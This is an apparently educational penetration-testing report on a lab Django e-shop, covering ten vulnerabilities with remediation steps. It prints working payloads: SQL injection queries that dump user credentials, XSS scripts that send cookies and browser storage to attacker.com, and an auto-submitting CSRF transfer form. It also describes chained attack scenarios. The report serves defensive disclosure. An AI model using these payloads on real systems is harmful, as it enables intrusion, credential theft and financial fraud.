# Penetration Testing Report - E-Shop Application

## Executive Summary

This report presents the findings from a comprehensive security assessment of the E-Shop web application. The assessment identified multiple critical vulnerabilities that pose significant risks to the confidentiality, integrity, and availability of the system and its data.

### Key Findings
- **10 vulnerabilities** identified across various security domains
- **4 CRITICAL** severity vulnerabilities requiring immediate attention
- **4 HIGH** severity vulnerabilities with significant impact potential
- **2 MEDIUM** severity vulnerabilities that should be addressed

The application's current security posture is inadequate for production deployment and requires extensive remediation efforts.

---

## 1. Assessment Overview

### 1.1 Scope
- **Target Application**: E-Shop Web Application
- **URL**: http://10.211.55.2:8000
- **Testing Period**: Educational Assessment
- **Methodology**: OWASP Testing Guide v4.2
- **Testing Type**: Gray-box penetration testing

### 1.2 Testing Environment
- **Testing Platform**: Kali Linux 2024.1 (10.211.55.4)
- **Target Platform**: macOS-hosted Django application (10.211.55.2)
- **Authentication**: Test accounts provided

### 1.3 Executive Risk Summary

| Risk Level | Count | Immediate Action Required |
|------------|-------|--------------------------|
| CRITICAL | 4 | Yes - Exploit demonstrated |
| HIGH | 4 | Yes - High likelihood of exploitation |
| MEDIUM | 2 | Recommended - Opportunistic attacks possible |
| LOW | 0 | N/A |

---

## 2. Technical Findings

### 2.1 CRITICAL - SQL Injection in Product Search

**CVSS Score**: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

#### Description
The product search functionality at `/catalog/?q=` is vulnerable to SQL injection due to unsanitized user input being directly concatenated into SQL queries.

#### Evidence
```http
GET /catalog/?q=' OR '1'='1'-- HTTP/1.1
Host: 10.211.55.2:8000

Response: All products displayed regardless of search term
```

#### Proof of Concept
```bash
# Extract database version
curl "http://10.211.55.2:8000/catalog/?q=' UNION SELECT 1,sqlite_version(),3,4,5,6--"

# Extract user credentials
curl "http://10.211.55.2:8000/catalog/?q=' UNION SELECT 1,username||':'||password,3,4,5,6 FROM auth_user--"
```

#### Impact
- Complete database compromise
- User credential theft
- Data manipulation capabilities
- Potential remote code execution

#### Remediation
1. Implement parameterized queries using Django ORM
2. Validate and sanitize all user inputs
3. Apply principle of least privilege to database user
4. Enable SQL query logging and monitoring

---

### 2.2 CRITICAL - Stored Cross-Site Scripting (XSS) in Product Reviews

**CVSS Score**: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

#### Description
Product review functionality stores and displays user input without proper sanitization, allowing persistent JavaScript injection.

#### Evidence
```javascript
// Payload submitted in review form
Title: <script>alert('XSS')</script>
Content: <img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

#### Proof of Concept
The following payload achieves session hijacking:
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    cookies: document.cookie,
    localStorage: Object.entries(localStorage),
    sessionStorage: Object.entries(sessionStorage)
}));
</script>
```

#### Impact
- Session hijacking
- Account takeover
- Phishing attacks
- Malware distribution

#### Remediation
1. Implement proper output encoding
2. Use Content Security Policy (CSP)
3. Enable Django's auto-escape in templates
4. Sanitize input using libraries like bleach

---

### 2.3 CRITICAL - Insecure Direct Object Reference (IDOR) in Order Management

**CVSS Score**: 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

#### Description
Order viewing functionality at `/order/<order_id>/` lacks proper authorization checks, allowing authenticated users to access any order.

#### Evidence
```bash
# User A's order
GET /order/ORD-ABCDE-12345/ HTTP/1.1
Cookie: sessionid=user_a_session

# Accessing User B's order with User A's session
GET /order/ORD-FGHIJ-67890/ HTTP/1.1
Cookie: sessionid=user_a_session

Result: Full order details including personal information exposed
```

#### Impact
- Unauthorized access to sensitive customer data
- Privacy violation
- Potential GDPR compliance issues
- Business intelligence exposure

#### Remediation
1. Implement proper authorization checks
2. Verify order ownership before displaying
3. Use UUIDs or random identifiers
4. Log unauthorized access attempts

---

### 2.4 CRITICAL - Cross-Site Request Forgery (CSRF) in Financial Transactions

**CVSS Score**: 8.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

#### Description
Critical state-changing operations lack CSRF protection, allowing attackers to perform unauthorized actions on behalf of authenticated users.

#### Evidence
```html
<!-- Malicious page forces credit transfer -->
<form action="http://10.211.55.2:8000/transfer-credits/" method="POST" id="csrf">
    <input type="hidden" name="recipient" value="attacker">
    <input type="hidden" name="amount" value="9999">
</form>
<script>document.getElementById('csrf').submit();</script>
```

#### Affected Endpoints
- `/transfer-credits/` - Financial transactions
- `/update-email/` - Account modifications

#### Impact
- Unauthorized financial transfers
- Account takeover
- Email hijacking
- Trust exploitation

#### Remediation
1. Enable Django's CSRF middleware
2. Include CSRF tokens in all forms
3. Validate referrer headers
4. Implement transaction confirmation

---

### 2.5 HIGH - Weak Password Storage (MD5 Hashing)

**CVSS Score**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Description
The application uses MD5 for password hashing, which is cryptographically broken and unsuitable for password storage.

#### Evidence
```python
# From settings.py
PASSWORD_HASHERS = [
    'django.contrib.auth.hashers.MD5PasswordHasher',
]
```

Cracked sample hashes:
- `5f4dcc3b5aa765d61d8327deb882cf99` → `password`
- `098f6bcd4621d373cade4e832627b4f6` → `test`

#### Impact
- Rapid password cracking
- Account compromise
- Credential stuffing attacks
- Compliance violations

#### Remediation
1. Migrate to Argon2 or bcrypt
2. Force password reset for all users
3. Implement password complexity requirements
4. Enable multi-factor authentication

---

### 2.6 HIGH - Session Security Misconfiguration

**CVSS Score**: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

#### Description
Session cookies lack security flags, making them vulnerable to interception and client-side access.

#### Evidence
```http
Set-Cookie: sessionid=abc123; Path=/
```
Missing flags:
- `Secure` - Allows transmission over HTTP
- `HttpOnly` - Accessible via JavaScript
- `SameSite` - No CSRF protection

#### Impact
- Session hijacking via XSS
- Man-in-the-middle attacks
- Cross-site request attacks

#### Remediation
1. Enable all security flags:
   ```python
   SESSION_COOKIE_SECURE = True
   SESSION_COOKIE_HTTPONLY = True
   SESSION_COOKIE_SAMESITE = 'Lax'
   ```
2. Implement session timeout
3. Regenerate session IDs after login

---

### 2.7 HIGH - User Enumeration via Login Error Messages

**CVSS Score**: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

#### Description
Login functionality provides different error messages for invalid usernames versus invalid passwords, enabling user enumeration.

#### Evidence
```
Username: admin, Password: wrong
Response: "Invalid password for user 'admin'"

Username: nonexistent, Password: test
Response: "Username 'nonexistent' does not exist in our system"
```

#### Impact
- Username harvesting
- Targeted brute force attacks
- Social engineering enablement
- Privacy concerns

#### Remediation
1. Use generic error messages
2. Implement account lockout
3. Add CAPTCHA after failed attempts
4. Enable rate limiting

---

### 2.8 HIGH - Debug Mode Enabled in Production

**CVSS Score**: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

#### Description
Django's DEBUG mode is enabled, exposing sensitive information through detailed error pages.

#### Evidence
```python
# settings.py
DEBUG = True
```

Information exposed:
- Full stack traces
- Environment variables
- File paths
- Database queries

#### Impact
- Information disclosure
- Source code exposure
- Configuration leakage
- Attack surface mapping

#### Remediation
1. Set `DEBUG = False`
2. Configure proper error pages
3. Implement centralized logging
4. Remove sensitive data from errors

---

### 2.9 MEDIUM - Missing Security Headers

**CVSS Score**: 4.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N)

#### Description
The application lacks critical security headers that provide defense-in-depth protection.

#### Missing Headers
- `X-Frame-Options` - Clickjacking protection
- `X-Content-Type-Options` - MIME sniffing prevention
- `Content-Security-Policy` - XSS mitigation
- `Strict-Transport-Security` - HTTPS enforcement

#### Remediation
1. Enable security headers middleware
2. Configure appropriate policies
3. Test header effectiveness
4. Monitor policy violations

---

### 2.10 MEDIUM - Reflected XSS in Search Results

**CVSS Score**: 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Description
Search query parameter is reflected without proper encoding in the results page.

#### Evidence
```
GET /catalog/?q=<script>alert('XSS')</script>
Response: Results for "<script>alert('XSS')</script>"
```

#### Remediation
1. HTML encode all output
2. Validate input format
3. Implement CSP
4. Use template auto-escaping

---

## 3. Attack Scenarios Demonstrated

### 3.1 Complete Account Takeover Chain

1. **Initial Access**: SQL injection to extract user emails
2. **Credential Theft**: Dump MD5 password hashes
3. **Password Cracking**: Break weak MD5 hashes
4. **Account Access**: Login with stolen credentials
5. **Privilege Escalation**: Access admin functionality
6. **Persistence**: Install XSS backdoor via reviews

### 3.2 Financial Fraud Scenario

1. **Reconnaissance**: Enumerate valid users via login
2. **Session Theft**: XSS to steal session cookies
3. **CSRF Attack**: Force credit transfers
4. **IDOR Exploitation**: Access all order history
5. **Data Exfiltration**: Extract customer database

---

## 4. Risk Assessment Matrix

| Vulnerability | Likelihood | Impact | Risk | Priority |
|--------------|------------|---------|------|----------|
| SQL Injection | Very High | Critical | Critical | P1 |
| Stored XSS | High | High | Critical | P1 |
| IDOR | High | High | Critical | P1 |
| CSRF | Medium | High | Critical | P1 |
| Weak Hashing | High | High | High | P2 |
| Session Security | High | Medium | High | P2 |
| User Enumeration | High | Low | Medium | P3 |
| Debug Mode | Medium | Medium | Medium | P3 |

---

## 5. Recommendations

### 5.1 Immediate Actions (24-48 hours)
1. **Disable the application** until critical vulnerabilities are patched
2. **Reset all user passwords** after implementing secure hashing
3. **Revoke all active sessions** to prevent ongoing attacks
4. **Enable Django security middleware** and CSRF protection
5. **Disable DEBUG mode** immediately

### 5.2 Short-term Fixes (1-2 weeks)
1. **Implement parameterized queries** throughout the application
2. **Enable output encoding** in all templates
3. **Add authorization checks** to all data access
4. **Deploy Web Application Firewall** (WAF) for additional protection
5. **Implement rate limiting** on authentication endpoints

### 5.3 Long-term Improvements (1-3 months)
1. **Security Training**: Mandatory secure coding training for developers
2. **Code Review Process**: Implement security-focused code reviews
3. **Automated Testing**: Deploy SAST/DAST tools in CI/CD pipeline
4. **Security Monitoring**: Implement SIEM and alerting
5. **Incident Response Plan**: Develop and test response procedures

---

## 6. Compliance Considerations

### 6.1 Regulatory Impact
- **GDPR**: Personal data exposure through IDOR
- **PCI DSS**: If processing payments, multiple violations
- **Data Protection**: Weak encryption and access controls

### 6.2 Business Impact
- **Reputation Damage**: Public disclosure of vulnerabilities
- **Financial Loss**: Fraud through CSRF and account takeover
- **Legal Liability**: Data breach notification requirements
- **Operational Disruption**: Potential ransomware or data destruction

---

## 7. Conclusion

The E-Shop application currently exhibits critical security vulnerabilities that make it unsuitable for production use. The combination of SQL injection, XSS, IDOR, and CSRF vulnerabilities creates multiple paths for complete system compromise.

**Overall Security Rating**: **F (Critical Risk)**

The application requires immediate attention and comprehensive security remediation before any production deployment. A follow-up assessment is strongly recommended after implementing the suggested fixes.

---

## Appendix A: Testing Tools Used

- **Burp Suite Professional**: HTTP proxy and scanner
- **SQLMap**: Automated SQL injection
- **OWASP ZAP**: Web application scanner
- **Nikto**: Web server scanner
- **Custom Python Scripts**: Targeted exploitation

## Appendix B: References

- OWASP Top 10 2021
- CWE/SANS Top 25
- Django Security Documentation
- NIST Cybersecurity Framework

---

**Report Prepared By**: Security Assessment Team  
**Date**: 2025-01-17  
**Classification**: CONFIDENTIAL - Internal Use Only